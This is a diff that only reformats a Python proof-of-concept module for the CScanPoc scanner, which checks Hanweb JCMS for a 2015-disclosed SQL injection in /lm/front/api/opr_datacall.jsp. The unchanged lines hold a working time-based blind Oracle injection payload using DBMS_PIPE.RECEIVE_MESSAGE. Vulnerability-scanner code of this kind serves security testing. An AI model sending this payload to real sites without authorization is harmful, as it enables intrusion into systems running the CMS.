@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Hanweb_0014' # 平台漏洞编号，留空
+    vuln_id = 'Hanweb_0014'  # 平台漏洞编号，留空
     name = '大汉JCMS /lm/front/api/opr_datacall.jsp sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-10-22'  # 漏洞公布时间
     desc = '''
         大汉科技（Hanweb) JCMS /lm/front/api/opr_datacall.jsp sql注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = '大汉JCMS'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '44d2ca15-91ba-4fa9-87d3-5eef830f66b0'
@@ -31,10 +33,10 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-    
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148625
+
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148625
             hh = hackhttp.hackhttp()
-            arg = self.target       
+            arg = self.target
             url = arg + "/lm/front/api/opr_datacall.jsp?fn_billstatus=E&vc_id=1"
             payload = "%27%20AND%204683=DBMS_PIPE.RECEIVE_MESSAGE(CHR(120)||CHR(104)||CHR(119)||CHR(98),5)%20AND%20%27OxYZ%27=%27OxYZ"
             url2 = url + payload
@@ -53,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
